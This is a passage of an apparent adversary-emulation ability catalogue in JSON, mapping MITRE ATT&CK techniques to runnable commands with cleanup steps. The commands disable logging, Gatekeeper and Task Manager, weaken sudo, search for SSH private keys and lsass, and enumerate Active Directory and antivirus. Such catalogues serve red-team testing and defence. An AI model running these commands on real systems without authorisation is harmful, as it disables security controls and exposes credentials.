["defense-evasion"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": ["reg delete HKLM\\SOFTWARE\\WOW6432Node\\Microsoft\\Windows\\CurrentVersion\\ImmersiveShell /v UseActionCenterExperience /f >nul 2>&1"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "reg add HKLM\\SOFTWARE\\WOW6432Node\\Microsoft\\Windows\\CurrentVersion\\ImmersiveShell /v UseActionCenterExperience /t REG_DWORD /d 0 /f", "language": null, "name": "cmd", "variations": [], "uploads": []}], "technique_name": "Modify Registry", "ability_id": "ef55deab0893319b07802b4d4bd1f38c", "technique_id": "T1112", "tactic": "defense-evasion", "requirements": [], "name": "Disable Windows Security Center Notifications", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Modify the registry of the currently logged in user using reg.exe via cmd console to disable the windows shutdown button.\nSee how ransomware abuses this technique- https://www.trendmicro.com/vinfo/us/threat-encyclopedia/malware/ransom.msil.screenlocker.a/\n", "repeatable": false, "privilege": "", "buckets": ["defense-evasion"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": ["reg delete \"HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\" /v shutdownwithoutlogon /f >nul 2>&1"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "reg add \"HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\" /v shutdownwithoutlogon /t REG_DWORD /d 0 /f", "language": null, "name": "cmd", "variations": [], "uploads": []}], "technique_name": "Modify Registry", "ability_id": "f756cf55128c32328f50443164ecaea6", "technique_id": "T1112", "tactic": "defense-evasion", "requirements": [], "name": "Disable Windows Shutdown Button", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Modify the registry of the currently logged in user using reg.exe via cmd console to disable the windows task manager application.\nSee example how Agent Tesla malware abuses this technique: https://any.run/report/ea4ea08407d4ee72e009103a3b77e5a09412b722fdef67315ea63f22011152af/a866d7b1-c236-4f26-a391-5ae32213dfc4#registry\n", "repeatable": false, "privilege": "", "buckets": ["defense-evasion"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": ["reg delete \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\" /v DisableTaskmgr /f >nul 2>&1"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "reg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\" /v DisableTaskmgr /t REG_DWORD /d 1 /f", "language": null, "name": "cmd", "variations": [], "uploads": []}], "technique_name": "Modify Registry", "ability_id": "237eeedec47b5899d497fa1803ae4028", "technique_id": "T1112", "tactic": "defense-evasion", "requirements": [], "name": "Disable Windows Task Manager application", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Modify the registry of the currently logged in user using reg.exe via cmd console to disable the windows toast notification.\nSee how azorult malware abuses this technique- https://app.any.run/tasks/a6f2ffe2-e6e2-4396-ae2e-04ea0143f2d8/\n", "repeatable": false, "privilege": "", "buckets": ["defense-evasion"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": ["reg delete HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\PushNotifications /v ToastEnabled /f >nul 2>&1"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "reg add HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\PushNotifications /v ToastEnabled /t REG_DWORD /d 0 /f", "language": null, "name": "cmd", "variations": [], "uploads": []}], "technique_name": "Modify Registry", "ability_id": "11a7fa65413753907dc69ac37db54798", "technique_id": "T1112", "tactic": "defense-evasion", "requirements": [], "name": "Disable Windows Toast Notifications", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Disables history collection in shells\n", "repeatable": false, "privilege": "", "buckets": ["defense-evasion"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.stockpile.app.parsers.acrn", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "no.logs"}]}], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "darwin", "command": "export HISTCONTROL=ignoreboth; whoami", "language": null, "name": "sh", "variations": [], "uploads": []}, {"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.stockpile.app.parsers.acrn", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "no.logs"}]}], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "linux", "command": "export HISTCONTROL=ignoreboth; whoami", "language": null, "name": "sh", "variations": [], "uploads": []}], "technique_name": "Impair Defenses: HISTCONTROL", "ability_id": "b3f5118a34b5aa8eee17a0344e815b77", "technique_id": "T1562.003", "tactic": "defense-evasion", "requirements": [{"relationship_match": [{"source": "root"}], "module": "plugins.stockpile.app.requirements.paw_provenance"}], "name": "Disable history collection", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "The atomic test disables the journal logging by searching and replacing the \"Storage\" parameter to \"none\" within the journald.conf file, thus any new journal entries will only be temporarily available in memory and not written to disk\n", "repeatable": false, "privilege": "", "buckets": ["defense-evasion"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": ["sudo sed -i 's/Storage=none/Storage=auto/' /etc/systemd/journald.conf; sudo systemctl restart systemd-journald"], "code": null, "timeout": 60, "build_target": null, "platform": "linux", "command": "sudo sed -i 's/Storage=auto/Storage=none/' /etc/systemd/journald.conf", "language": null, "name": "sh", "variations": [], "uploads": []}], "technique_name": "Impair Defenses", "ability_id": "4ac711084ed7c8c6594c680874eaf931", "technique_id": "T1562", "tactic": "defense-evasion", "requirements": [], "name": "Disable journal logging via sed utility", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "The atomic test disables the journal logging using built-in systemctl utility\n", "repeatable": false, "privilege": "", "buckets": ["defense-evasion"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": ["sudo systemctl start systemd-journald; sudo systemctl enable systemd-journald"], "code": null, "timeout": 60, "build_target": null, "platform": "linux", "command": "sudo systemctl stop systemd-journald", "language": null, "name": "sh", "variations": [], "uploads": []}], "technique_name": "Impair Defenses", "ability_id": "b2c83d7fbfb70861d13c2ba65ea483eb", "technique_id": "T1562", "tactic": "defense-evasion", "requirements": [], "name": "Disable journal logging via systemctl utility", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Disables macOS Gatekeeper\n", "repeatable": false, "privilege": "", "buckets": ["defense-evasion"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": ["sudo spctl --master-enable"], "code": null, "timeout": 60, "build_target": null, "platform": "darwin", "command": "sudo spctl --master-disable", "language": null, "name": "sh", "variations": [], "uploads": []}], "technique_name": "Impair Defenses: Disable or Modify Tools", "ability_id": "93127a8c6cdb05fd84f871a5faa9d7c7", "technique_id": "T1562.001", "tactic": "defense-evasion", "requirements": [], "name": "Disable macOS Gatekeeper", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Disables syslog collection\n", "repeatable": false, "privilege": "", "buckets": ["defense-evasion"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.stockpile.app.parsers.acrn", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "no.logs"}]}], "cleanup": ["systemctl start rsyslog ; systemctl enable rsyslog"], "code": null, "timeout": 60, "build_target": null, "platform": "linux", "command": "if (rpm -q rsyslog 2>&1 >/dev/null) || (dpkg -s rsyslog | grep -q installed) > /dev/null; then : ; else sudo (which yum && yum -y install epel-release rsyslog)||(which apt-get && apt-get install -y rsyslog); fi;  ;  systemctl stop rsyslog ; systemctl disable rsyslog", "language": null, "name": "sh", "variations": [], "uploads": []}], "technique_name": "Impair Defenses: Disable or Modify Tools", "ability_id": "3a68db58e75f8887944e846f0455f758", "technique_id": "T1562.001", "tactic": "defense-evasion", "requirements": [{"relationship_match": [{"source": "root"}], "module": "plugins.stockpile.app.requirements.paw_provenance"}], "name": "Disable syslog", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Sets sudo caching tty_tickets value to disabled. This is dangerous to modify without using 'visudo', do not do this on a production system.\n", "repeatable": false, "privilege": "", "buckets": ["multiple"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "darwin", "command": "sudo sh -c \"echo Defaults \"'!'\"tty_tickets >> /etc/sudoers\"; sudo visudo -c -f /etc/sudoers", "language": null, "name": "sh", "variations": [], "uploads": []}, {"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "linux", "command": "sudo sh -c \"echo Defaults \"'!'\"tty_tickets >> /etc/sudoers\"; sudo visudo -c -f /etc/sudoers", "language": null, "name": "sh", "variations": [], "uploads": []}], "technique_name": "Abuse Elevation Control Mechanism: Sudo and Sudo Caching", "ability_id": "adaa45fb1e639a778fbac7cba1278bcb", "technique_id": "T1548.003", "tactic": "multiple", "requirements": [], "name": "Disable tty_tickets for sudo caching", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Modify the registry of the currently logged in user using reg.exe via cmd console to prevent user running specific computer programs that could aid them in manually removing malware or detecting it \nusing security product.\n", "repeatable": false, "privilege": "", "buckets": ["defense-evasion"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": ["reg delete HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer /v DisallowRun /f >nul 2>&1 && reg delete HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\DisallowRun /v art1 /f >nul 2>&1 && reg delete HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\DisallowRun /v art2 /f >nul 2>&1"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "reg add HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer /v DisallowRun /t REG_DWORD /d 1 /f && reg add HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\DisallowRun /f /t REG_SZ /v art1 /d \"regedit.exe\" && reg add HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\DisallowRun /f /t REG_SZ /v art2 /d \"cmd.exe\"", "language": null, "name": "cmd", "variations": [], "uploads": []}], "technique_name": "Modify Registry", "ability_id": "0bc2cabb6dbb0a6be7e9436f0107b574", "technique_id": "T1112", "tactic": "defense-evasion", "requirements": [], "name": "DisallowRun Execution Of Certain Applications", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": true, "description": "Use PowerView to query the Active Directory server to determine remote admins", "repeatable": false, "privilege": "", "buckets": ["discovery"], "access": {}, "executors": [{"additional_info": {}, "payloads": ["powerview.ps1"], "parsers": [{"module": "plugins.stockpile.app.parsers.netlocalgroup", "parserconfigs": [{"custom_parser_vals": {}, "edge": "has_admin", "target": "domain.user.name", "source": "remote.host.fqdn"}]}], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "Import-Module .\\powerview.ps1;\nGet-NetLocalGroupMember -ComputerName #{remote.host.fqdn}", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Permission Groups Discovery: Domain Groups", "ability_id": "6d90e6fa-9324-4eb5-93be-9f737245bd7z", "technique_id": "T1069.002", "tactic": "discovery", "requirements": [], "name": "Discover Domain Admins", "plugin": "stockpile"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Identify the organizations mail server", "repeatable": false, "privilege": "", "buckets": ["discovery"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.stockpile.app.parsers.basic", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "target.org.emailhost"}]}], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "linux", "command": "host \"#{target.org.domain}\" | grep mail | grep -oE '[^ ]+$' | rev | cut -c 2- | rev", "language": null, "name": "sh", "variations": [], "uploads": []}, {"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.stockpile.app.parsers.basic", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "target.org.emailhost"}]}], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "darwin", "command": "host \"#{target.org.domain}\" | grep mail | grep -oE '[^ ]+$' | rev | cut -c 2- | rev", "language": null, "name": "sh", "variations": [], "uploads": []}, {"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.stockpile.app.parsers.basic", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "target.org.emailhost"}]}], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "(nslookup -querytype=mx #{target.org.domain}. | Select-String -pattern 'mail' | Out-String).Trim()", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Remote System Discovery", "ability_id": "ce485320-41a4-42e8-a510-f5a8fe96a644", "technique_id": "T1018", "tactic": "discovery", "requirements": [], "name": "Discover Mail Server", "plugin": "stockpile"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Discover private SSH keys on a macOS or Linux system.\n", "repeatable": false, "privilege": "", "buckets": ["credential-access"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": ["rm /tmp/keyfile_locations.txt"], "code": null, "timeout": 60, "build_target": null, "platform": "darwin", "command": "find / -name id_rsa 2>/dev/null >> /tmp/keyfile_locations.txt", "language": null, "name": "sh", "variations": [], "uploads": []}, {"additional_info": {}, "payloads": [], "parsers": [], "cleanup": ["rm /tmp/keyfile_locations.txt"], "code": null, "timeout": 60, "build_target": null, "platform": "linux", "command": "find / -name id_rsa 2>/dev/null >> /tmp/keyfile_locations.txt", "language": null, "name": "sh", "variations": [], "uploads": []}], "technique_name": "Unsecured Credentials: Private Keys", "ability_id": "6654bd2e9450280229dcfd92026252e8", "technique_id": "T1552.004", "tactic": "credential-access", "requirements": [], "name": "Discover Private SSH Keys", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Adversaries may use command line tools to discover specific processes in preparation of further attacks. \nExamples of this could be discovering the PID of lsass.exe to dump its memory or discovering whether specific security processes (e.g. AV or EDR) are running.\n", "repeatable": false, "privilege": "", "buckets": ["discovery"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "tasklist | findstr lsass", "language": null, "name": "cmd", "variations": [], "uploads": []}], "technique_name": "Process Discovery", "ability_id": "eba68ea18bc9ac93808fffbdcf7c3a3f", "technique_id": "T1057", "tactic": "discovery", "requirements": [], "name": "Discover Specific Process - tasklist", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Identify System language by checking the environment variables\n\nUpon successful execution, the 5 character locale result can be looked up to\ncorrelate the language and territory. Environment query commands are likely\nto run with a pattern match command e.g. `env | grep LANG`\n\nNote: `env` and `printenv` will usually provide the same results. `set` is\nalso used as a builtin command that does not generate syscall telemetry but\ndoes provide a list of the environment variables.\n", "repeatable": false, "privilege": "", "buckets": ["discovery"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "linux", "command": "env | grep LANG; printenv LANG; set | grep LANG", "language": null, "name": "sh", "variations": [], "uploads": []}], "technique_name": "System Location Discovery: System Language Discovery", "ability_id": "c094dbd7b13ef134c59b6c211c4bb5ba", "technique_id": "T1614.001", "tactic": "discovery", "requirements": [], "name": "Discover System Language by Environment Variable Query", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Identify System language by querying the registry on an endpoint. \n\nUpon successful execution, result in number format can be looked up to correlate the language.\n", "repeatable": false, "privilege": "", "buckets": ["discovery"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "reg query HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Nls\\Language", "language": null, "name": "cmd", "variations": [], "uploads": []}], "technique_name": "System Location Discovery: System Language Discovery", "ability_id": "4f978da47c3dfb3fbf98ecc3cc99c92b", "technique_id": "T1614.001", "tactic": "discovery", "requirements": [], "name": "Discover System Language by Registry Query", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Identify System language with the by reading the locale configuration file.\n\nThe locale configuration file contains the `LANG` environment variable which\nwill contain the 5 character locale that can be looked up to correlate the\nlanguage and territory.\n", "repeatable": false, "privilege": "", "buckets": ["discovery"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "linux", "command": "[ -f /etc/locale.conf ] && cat /etc/locale.conf || cat /etc/default/locale", "language": null, "name": "sh", "variations": [], "uploads": []}], "technique_name": "System Location Discovery: System Language Discovery", "ability_id": "40e77f5ee2d3d426ec1a7eb624df6f2f", "technique_id": "T1614.001", "tactic": "discovery", "requirements": [], "name": "Discover System Language by locale file", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Identify System language with the chcp command.\n\nUpon successful execution, result in number format can be looked up to correlate the language.\n", "repeatable": false, "privilege": "", "buckets": ["discovery"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "chcp", "language": null, "name": "cmd", "variations": [], "uploads": []}], "technique_name": "System Location Discovery: System Language Discovery", "ability_id": "f92a238fc446f89dc01f73b6c30264c3", "technique_id": "T1614.001", "tactic": "discovery", "requirements": [], "name": "Discover System Language with chcp", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Identify System language with the `locale` command.\n\nUpon successful execution, the output will contain the environment variables that indicate\nthe 5 character locale that can be looked up to correlate the language and territory.\n", "repeatable": false, "privilege": "", "buckets": ["discovery"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "linux", "command": "locale", "language": null, "name": "sh", "variations": [], "uploads": []}], "technique_name": "System Location Discovery: System Language Discovery", "ability_id": "0475abc9998e42d07d67958f96697eec", "technique_id": "T1614.001", "tactic": "discovery", "requirements": [], "name": "Discover System Language with locale", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Identify System language with the `localectl` command.\n\nUpon successful execution, the key `System Locale` from the output will contain the\n`LANG` environment variable that has the 5 character locale result that can be looked\nup to correlate the language and territory.\n", "repeatable": false, "privilege": "", "buckets": ["discovery"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "linux", "command": "localectl status", "language": null, "name": "sh", "variations": [], "uploads": []}], "technique_name": "System Location Discovery: System Language Discovery", "ability_id": "1d87f5f8838a166e5035179c33e3d615", "technique_id": "T1614.001", "tactic": "discovery", "requirements": [], "name": "Discover System Language with localectl", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Identify AV", "repeatable": false, "privilege": "", "buckets": ["discovery"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.stockpile.app.parsers.antivirus", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "host.installed.av"}]}], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "darwin", "command": "find /Applications/ -maxdepth 2 -iname *.app | grep -io \"[a-z ]*\\.app\" | grep -Ei -- \"symantec|norton|bitdefender|kapersky|eset|avast|avira|malwarebytes|sophos|(trend micro)\"", "language": null, "name": "sh", "variations": [], "uploads": []}, {"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.stockpile.app.parsers.basic", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "host.installed.av"}]}], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "wmic /NAMESPACE:\\\\root\\SecurityCenter2 PATH AntiVirusProduct GET /value", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Software Discovery: Security Software Discovery", "ability_id": "2dece965-37a0-4f70-a391-0f30e3331aba", "technique_id": "T1518.001", "tactic": "discovery", "requirements": [], "name": "Discover antivirus programs", "plugin": "stockpile"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Identify the remote domain controllers", "repeatable": false, "privilege": "", "buckets": ["discovery"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "nltest /dsgetdc:%USERDOMAIN%", "language": null, "name": "cmd", "variations": [], "uploads": []}, {"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "nltest /dsgetdc:$env:USERDOMAIN", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Remote System Discovery", "ability_id": "26c8b8b5-7b5b-4de1-a128-7d37fb14f517", "technique_id": "T1018", "tactic": "discovery", "requirements": [], "name": "Discover domain controller", "plugin": "stockpile"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Discovers processes that the current user has the ability to access and selects an injectable one", "repeatable": false, "privilege": "", "buckets": ["discovery"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.stockpile.app.parsers.json", "parserconfigs": [{"custom_parser_vals": {"json_key": "Id", "json_type": "int"}, "edge": "", "target": "", "source": "host.process.id"}]}], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "$owners = @{};\ngwmi win32_process |% {$owners[$_.handle] = $_.getowner().user};\n$ps = get-process | select processname,Id,@{l=\"Owner\";e={$owners[$_.id.tostring()]}};\n$valid = foreach($p in $ps) { if($p.Owner -eq $env:USERNAME -And $p.ProcessName -eq \"svchost\") {$p} };\n$valid | ConvertTo-Json", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Process Discovery", "ability_id": "05cda6f6-2b1b-462e-bff1-845af94343f7", "technique_id": "T1057", "tactic": "discovery", "requirements": [], "name": "Discover injectable process", "plugin": "stockpile"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Use PowerView to query the Active Directory server for a list of computers in the Domain", "repeatable": false, "privilege": "", "buckets": ["discovery"], "access": {}, "executors": [{"additional_info": {}, "payloads": ["powerview.ps1"], "parsers": [{"module": "plugins.stockpile.app.parsers.gdomain", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "remote.host.fqdn"}]}], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "Import-Module .\\powerview.ps1;\nGet-DomainComputer", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Remote System Discovery", "ability_id": "13379ae1-d20e-4162-91f8-320d78a35e7f", "technique_id": "T1018", "tactic": "discovery", "requirements": [], "name": "Discover local hosts", "plugin": "stockpile"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Identify system services", "repeatable": false, "privilege": "", "buckets": ["discovery"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "Get-Service", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "System Service Discovery", "ability_id": "c6607391-d02c-44b5-9b13-d3492ca58599", "technique_id": "T1007", "tactic": "discovery", "requirements": [], "name": "Discover system services", "plugin": "stockpile"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Emulates attack with a DiskShadow.exe (LOLBIN installed by default on Windows) being used to execute arbitrary commands Reference: https://bohops.com/2018/03/26/diskshadow-the-return-of-vss-evasion-persistence-and-active-directory-database-extraction/\n", "repeatable": false, "privilege": "", "buckets": ["defense-evasion"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": null, "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Signed Binary Proxy Execution", "ability_id": "5091ad13565a0e0369be0998e2affd1d", "technique_id": "T1218", "tactic": "defense-evasion", "requirements": [], "name": "DiskShadow Command Execution", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Uses the built-in Windows utility gpresult to display the Resultant Set of Policy (RSoP) information for a remote user and computer\nThe /z parameter displays all available information about Group Policy. More parameters can be found in the linked Microsoft documentation\nhttps://docs.microsoft.com/en-us/windows-server/administration/windows-commands/gpresult\nhttps://unit42.paloaltonetworks.com/emissary-trojan-changelog-did-operation-lotus-blossom-cause-it-to-evolve/\nTurla has used the /z and /v parameters: https://www.welivesecurity.com/wp-content/uploads/2020/05/ESET_Turla_ComRAT.pdf\n", "repeatable": false, "privilege": "", "buckets": ["discovery"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "gpresult /z", "language": null, "name": "cmd", "variations": [], "uploads": []}], "technique_name": "Group Policy Discovery", "ability_id": "efc8346315601012db4a1f9afd7436a4", "technique_id": "T1615", "tactic": "discovery", "requirements": [], "name": "Display group policy information via gpresult", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Turn a computers WIFI off", "repeatable": false, "privilege": "", "buckets": ["impact"], "access": {}, "executors": [{"additional_info": {}, "payloads": ["wifi.sh"], "parsers": [], "cleanup": ["./wifi.sh on"], "code": null, "timeout": 60, "build_target": null, "platform": "darwin", "command": "./wifi.sh off", "language": null, "name": "sh", "variations": [], "uploads": []}, {"additional_info": {}, "payloads": ["wifi.sh"], "parsers": [], "cleanup": ["./wifi.sh on"], "code": null, "timeout": 60, "build_target": null, "platform": "linux", "command": "./wifi.sh off", "language": null, "name": "sh", "variations": [], "uploads": []}, {"additional_info": {}, "payloads": ["wifi.ps1"], "parsers": [], "cleanup": [".\\wifi.ps1 -On"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": ".\\wifi.ps1 -Off", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Endpoint Denial of Service", "ability_id": "2fe2d5e6-7b06-4fc0-bf71-6966a1226731", "technique_id": "T1499", "tactic": "impact", "requirements": [{"relationship_match": [{"source": "wifi.network.ssid"}], "module": "plugins.stockpile.app.requirements.paw_provenance"}], "name": "Disrupt WIFI", "plugin": "stockpile"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Do Not Connect To Win Update. Redline is using this as part of its defense evasion.\n", "repeatable": false, "privilege": "", "buckets": ["defense-evasion"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": ["reg add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\WindowsUpdate\" /v \"DoNotConnectToWindowsUpdateInternetLocations\" /t REG_DWORD /d 0"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "reg add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\WindowsUpdate\" /v \"DoNotConnectToWindowsUpdateInternetLocations\" /t REG_DWORD /d 1", "language": null, "name": "cmd", "variations": [], "uploads": []}], "technique_name": "Modify Registry", "ability_id": "caba55db8a5579c5244fd6cc7e3574df", "technique_id": "T1112", "tactic": "defense-evasion", "requirements": [], "name": "Do Not Connect To Win Update", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "This test simulates a command that can be run to enumerate files that have the setgid bit set\n", "repeatable": false, "privilege": "", "buckets": ["multiple"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "linux", "command": "find /usr/bin -perm -2000", "language": null, "name": "sh", "variations": [], "uploads": []}], "technique_name": "Abuse Elevation Control Mechanism: Setuid and Setgid", "ability_id": "3e78d2e02cf72b0ed83ba4849ff1f32e", "technique_id": "T1548.001", "tactic": "multiple", "requirements": [], "name": "Do reconnaissance for files that have the setgid bit set", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "This test simulates a command that can be run to enumerate files that have the setuid bit set\n", "repeatable": false, "privilege": "", "buckets": ["multiple"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.stockpile.app.parsers.acrn", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "setuid.info"}]}], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "linux", "command": "find /usr/bin -perm -4000", "language": null, "name": "sh", "variations": [], "uploads": []}], "technique_name": "Abuse Elevation Control Mechanism: Setuid and Setgid", "ability_id": "3e1dbbddf490e1869a130a07cb254e5f", "technique_id": "T1548.001", "tactic": "multiple", "requirements": [], "name": "Do reconnaissance for files that have the setuid bit set", "plugin": "atomic"}, {"delete_payload": true, "additional_info": 